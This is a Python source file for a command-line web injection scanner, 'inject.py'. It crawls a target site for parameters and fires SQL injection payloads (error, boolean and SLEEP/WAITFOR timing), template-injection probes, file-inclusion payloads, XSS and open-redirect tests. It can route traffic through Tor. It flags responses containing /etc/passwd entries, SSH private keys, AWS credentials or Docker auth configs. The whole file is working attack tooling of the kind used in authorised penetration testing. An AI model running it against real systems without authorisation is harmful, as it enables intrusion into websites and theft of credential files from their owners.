#!/usr/bin/env python3
"""
inject.py — differential injection prover.

Design rule: a finding exists only when the payload response differs measurably
from a matched control on the SAME parameter. HTTP 200 is never evidence.

Detectors: sqli (error/time/boolean), ssti (math eval), lfi (file signature),
xss (reflection with context), open-redirect (Location/body).

usage:
  python3 inject.py https://target.com/page --param id
  python3 inject.py https://target.com/page --crawl --max-params 20
  python3 inject.py https://target.com/page --param id --types sqli,ssti --json out.json
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lib.webutil import (Client, Differ, Baseline, jsonout, norm_url, neutralise,  # noqa: E402
                         redact, save_raw, table)

HERE = os.path.dirname(os.path.abspath(__file__))
PL = os.path.join(HERE, "payloads")


def load(name):
    p = os.path.join(PL, name)
    if not os.path.exists(p):
        return []
    with open(p) as f:
        return [l.rstrip("\n") for l in f if l.strip() and not l.startswith("#")]


DB_ERRORS = [
    r"SQL syntax.*MySQL", r"Warning.*\bmysqli?_", r"valid MySQL result",
    r"PostgreSQL.*ERROR", r"pg_query\(\)", r"unterminated quoted string",
    r"ORA-\d{4,5}", r"Oracle error", r"Microsoft OLE DB Provider for ODBC",
    r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver", r"Unclosed quotation mark after the character string",
    r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite",
    r"quoted string not properly terminated", r"Syntax error.*in query expression",
    r"division by zero", r"Unknown column", r"Unknown table", r"SQLSTATE\[",
    r"Incorrect syntax near", r"mysql_fetch", r"You have an error in your SQL syntax",
]

FILE_SIGS = {
    "linux_passwd": r"root:.*:0:0:",
    "win_ini": r"\[(fonts|extensions|mci extensions)\]",
    "proc_environ": r"(PATH=|HOME=|HTTP_USER_AGENT=)",
    "ssh_key": r"-----BEGIN (RSA |OPENSSH |EC |DSA )?PRIVATE KEY-----",
    "aws_creds": r"aws_access_key_id",
    "docker_cfg": r'"auths"\s*:',
}

# (payload, expected marker) — marker must appear in output when template evaluates
SSTI_CHECKS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${{7*7}}", "49"),
    ("@(7*7)", "49"),
    ("{7*7}", "49"),
]


def pget(client, url, param, payload, headers=None):
    u = urllib.parse.urlsplit(url)
    q = dict(urllib.parse.parse_qsl(u.query, keep_blank_values=True))
    q[param] = payload
    new = urllib.parse.urlunsplit((u.scheme, u.netloc, u.path, urllib.parse.urlencode(q, doseq=True), u.fragment))
    return client.get(new, headers=headers)


def control_payload(param, payload):
    """Backwards-compatible alias."""
    return neutralise(payload)


# --------------------------------------------------------------------------- #
def test_sqli(client, url, param, waf_headers=None):
    findings = []
    d = Differ(client)
    base = pget(client, url, param, "1")
    if not base.ok:
        return findings

    # error-based
    for p in load("sqli.txt"):
        if "SLEEP" in p.upper() or "WAITFOR" in p.upper() or "PG_SLEEP" in p.upper():
            continue
        r = pget(client, url, param, p)
        for pat in DB_ERRORS:
            if re.search(pat, r.body, re.I):
                findings.append({"type": "sqli", "class": "error-based", "param": param,
                                 "payload": p, "evidence": f"DB error signature: {pat}",
                                 "status": "STRONG"})
                save_raw(f"sqli_error_{param}_{abs(hash(p))%9999}.txt", r.body, url)
                return findings

    # boolean-based: 1=1 vs 1=2 must differ from each other AND from neutral
    pairs = [("' AND 1=1-- -", "' AND 1=2-- -"), ("1 AND 1=1", "1 AND 1=2"),
             ("' AND '1'='1", "' AND '1'='2"), ("1) AND 1=1-- -", "1) AND 1=2-- -")]
    for t, fa in pairs:
        rt = pget(client, url, param, t)
        rf = pget(client, url, param, fa)
        dv = d.compare(rt, rf)
        sim = dv.get("similarity")
        if sim is not None and sim < 0.97 and abs((dv.get("ratio") or 1) - 1) > 0.10:
            findings.append({"type": "sqli", "class": "boolean-based", "param": param,
                             "payload": f"{t} vs {fa}", "evidence": dv,
                             "status": Differ.verdict(dv)})

    # time-based: control keeps the payload shape but loses the sleep keyword,
    # then we repeat to kill jitter false-positives
    for p in ("' AND SLEEP(5)-- -", "'||(SELECT SLEEP(5))||'", "';SELECT PG_SLEEP(5)-- ",
              "1 WAITFOR DELAY '0:0:5'-- -", "1 AND SLEEP(5)"):
        r = pget(client, url, param, p)
        ctl = pget(client, url, param, neutralise(p))
        delta = (r.elapsed - ctl.elapsed) * 1000
        if delta >= 5 * 1000 * 0.7:
            r2 = pget(client, url, param, p)
            ctl2 = pget(client, url, param, neutralise(p))
            delta2 = (r2.elapsed - ctl2.elapsed) * 1000
            if delta2 >= 5 * 1000 * 0.7:
                findings.append({"type": "sqli", "class": "time-based", "param": param,
                                 "payload": p,
                                 "evidence": {"delta_ms": round(delta), "delta_ms_repeat": round(delta2)},
                                 "status": "STRONG"})
                return findings
    return findings


def test_ssti(client, url, param):
    findings = []
    for p, marker in SSTI_CHECKS:
        r = pget(client, url, param, p)
        if not r.ok:
            continue
        # marker must appear where the raw payload does NOT literally appear
        if marker in r.body and p not in r.body:
            findings.append({"type": "ssti", "param": param, "payload": p,
                             "evidence": f"evaluated to {marker}, raw payload absent",
                             "status": "STRONG"})
            return findings
    return findings


def test_lfi(client, url, param):
    findings = []
    for p in load("lfi.txt"):
        r = pget(client, url, param, p)
        if not r.ok:
            continue
        for name, sig in FILE_SIGS.items():
            if re.search(sig, r.body, re.I | re.S):
                findings.append({"type": "lfi", "param": param, "payload": p,
                                 "evidence": f"file signature matched: {name}",
                                 "status": "STRONG"})
                save_raw(f"lfi_{param}.txt", r.body, url)
                return findings
        # php filter base64 output
        if "php://filter" in p:
            m = re.search(r"([A-Za-z0-9+/]{80,}={0,2})", r.body)
            if m:
                import base64
                try:
                    dec = base64.b64decode(m.group(1) + "==").decode("utf-8", "ignore")
                    if "<?php" in dec or "<?" in dec:
                        findings.append({"type": "lfi", "param": param, "payload": p,
                                         "evidence": "base64 filter decoded to source",
                                         "status": "STRONG"})
                        return findings
                except Exception:
                    pass
    return findings


def test_xss(client, url, param):
    findings = []
    r0 = pget(client, url, param, "wexec1337canary")
    if "wexec1337canary" not in r0.body:
        return findings
    ctype = r0.header("content-type", "")
    for p in load("xss.txt"):
        r = pget(client, url, param, p)
        if not r.ok:
            continue
        if p in r.body or p.replace("&", "&amp;") in r.body:
            # check the dangerous chars survived unencoded
            tail = p.split("alert(1)")[-1] if "alert(1)" in p else ""
            survived = ("<script" in r.body.lower() and p in r.body) or \
                       ("onerror" in r.body.lower() and p in r.body) or \
                       ("onload" in r.body.lower() and p in r.body)
            findings.append({"type": "xss", "param": param, "payload": p,
                             "evidence": "reflected; tags intact" if survived else "reflected (encoded/sanitised)",
                             "status": "STRONG" if survived else "WEAK",
                             "context": ctype})
            if survived:
                return findings
    return findings


def test_redirect(client, url, param):
    findings = []
    for p in load("open-redirect.txt"):
        r = pget(client, url, param, p)
        loc = r.header("location", "")
        if loc and re.search(r"(evil\.example)", loc, re.I):
            findings.append({"type": "open-redirect", "param": param, "payload": p,
                             "evidence": f"Location: {loc}", "status": "STRONG"})
        body_hit = re.search(r'(href|action|src)\s*=\s*["\'](https?:)?//evil\.example', r.body, re.I)
        if body_hit:
            findings.append({"type": "open-redirect", "param": param, "payload": p,
                             "evidence": f"body sink: {body_hit.group(0)[:60]}", "status": "WEAK"})
    return findings


TESTS = {"sqli": test_sqli, "ssti": test_ssti, "lfi": test_lfi, "xss": test_xss, "redirect": test_redirect}


# --------------------------------------------------------------------------- #
def discover_params(client: Client, url: str, limit=25) -> dict:
    """Find GET params worth testing. Uses live form crawl, not a static wordlist."""
    r = client.get(url)
    params = []
    seen = set()

    # 1. params already in the URL
    u = urllib.parse.urlsplit(url)
    for k, v in urllib.parse.parse_qsl(u.query, keep_blank_values=True):
        if k not in seen:
            params.append({"param": k, "value": v, "from": "url"})
            seen.add(k)

    # 2. forms on the page (GET + POST)
    forms = []
    for m in re.finditer(r"<form\b([^>]*)>(.*?)</form>", r.body, re.I | re.S):
        attrs, inner = m.group(1), m.group(2)
        action = re.search(r'action\s*=\s*["\']([^"\']*)', attrs, re.I)
        method = re.search(r'method\s*=\s*["\']([^"\']*)', attrs, re.I)
        inputs = []
        for im in re.finditer(r"<(input|textarea|select)\b([^>]*)>", inner, re.I):
            n = re.search(r'name\s*=\s*["\']([^"\']+)', im.group(2), re.I)
            t = re.search(r'type\s*=\s*["\']([^"\']+)', im.group(2), re.I)
            if n:
                inputs.append({"name": n.group(1), "type": (t.group(1) if t else "text").lower()})
        forms.append({"action": (action.group(1) if action else url),
                      "method": (method.group(1) if method else "GET").upper(),
                      "inputs": inputs})
        for i in inputs:
            if i["type"] not in ("submit", "button", "reset", "file") and i["name"] not in seen:
                params.append({"param": i["name"], "value": "", "from": "form",
                               "action": (action.group(1) if action else url),
                               "method": (method.group(1) if method else "GET").upper()})
                seen.add(i["name"])

    # 3. query strings leaked in JS/links
    for m in re.finditer(r"[?&]([a-zA-Z_][a-zA-Z0-9_]{1,24})=", r.body):
        k = m.group(1)
        if k not in seen:
            params.append({"param": k, "value": "", "from": "link"})
            seen.add(k)

    return {"params": params[:limit], "forms": forms[:20]}


def run(target, params=None, crawl=False, types="sqli,ssti,lfi,xss,redirect",
        max_params=15, proxy=None, tor=False, timeout=15, delay=0.0, client=None):
    """Library entry point. Returns result dict; findings carry STRONG/WEAK status."""
    url = norm_url(target)
    client = client or Client(timeout=timeout, delay=delay,
                              proxy=proxy or ("socks5h://127.0.0.1:9050" if tor else None))

    params = list(params or [])
    crawl_data = {}
    if crawl or not params:
        crawl_data = discover_params(client, url, max_params)
        params = [p["param"] for p in crawl_data["params"]]
    types = [t.strip() for t in types.split(",") if t.strip() in TESTS]

    result = {"target": url, "params": params, "types": types, "findings": [], "crawl": crawl_data}
    if not params:
        result["note"] = "no parameters found — supply params or a URL with query string"
        result["summary"] = {"tested": 0, "findings": 0, "strong": 0}
        return result

    for p in params:
        for t in types:
            try:
                found = TESTS[t](client, url, p)
            except Exception as e:  # noqa: BLE001
                found = [{"type": t, "param": p, "status": "ERROR", "evidence": str(e)}]
            for f in found:
                f["param"] = p
                result["findings"].append(f)

    strong = [f for f in result["findings"] if f.get("status") == "STRONG"]
    result["summary"] = {"tested": len(params) * len(types),
                         "findings": len(result["findings"]), "strong": len(strong)}
    return result


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("--param", action="append", default=[])
    ap.add_argument("--crawl", action="store_true")
    ap.add_argument("--types", default="sqli,ssti,lfi,xss,redirect")
    ap.add_argument("--max-params", type=int, default=15)
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--tor", action="store_true")
    ap.add_argument("--json", default=None)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--delay", type=float, default=0.0)
    a = ap.parse_args()

    result = run(a.target, a.param, a.crawl, a.types, a.max_params, a.proxy, a.tor,
                 a.timeout, a.delay)
    for f in result["findings"]:
        print(f"[{f.get('status')}] {f['type']}/{f.get('class','-')} param={f.get('param')} "
              f"payload={redact(str(f.get('payload')))[:60]}", file=sys.stderr)
    out = jsonout(result)
    print(out)
    if a.json:
        with open(a.json, "w") as f:
            f.write(out)
    strong = result["summary"].get("strong", 0)
    return 0 if not strong else 1


if __name__ == "__main__":
    sys.exit(main())
